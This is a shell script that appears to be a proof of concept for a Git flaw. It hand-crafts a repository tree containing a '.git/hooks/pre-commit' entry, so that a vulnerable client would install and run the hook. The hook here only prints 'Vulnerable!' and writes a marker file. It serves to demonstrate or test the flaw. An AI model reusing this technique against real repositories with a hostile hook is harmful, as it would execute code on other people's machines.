#!/bin/sh
set -eu

readonly filename='.git/hooks/pre-commit'
readonly filemode=100755

emit_payload() {
    cat <<'EOF'
#!/bin/sh
printf 'Vulnerable!\n'
date >vulnerable
EOF
}

# Initialize the repository.
repo="$1"
git init -- "$repo"
cd -- "$repo"
branch="$(git symbolic-ref --short HEAD)"

# Create the blob of the payload.
blob_hash="$(emit_payload | git hash-object -w --stdin)"
escaped_blob_hash="$(printf '%s' "$blob_hash" | sed 's/../\\x&/g')"

# Create the top-level tree object referencing the blob with the stange name.
tree_hash="$(
    printf '%s %s\0'"$escaped_blob_hash" "$filemode" "$filename" |
    git hash-object -t tree -w --stdin
)"

# Commit the tree as an initial commit, setting the default branch to it.
commit_hash="$(git commit-tree -m 'Initial commit' "$tree_hash")"
git branch -f -- "$branch" "$commit_hash"
git show
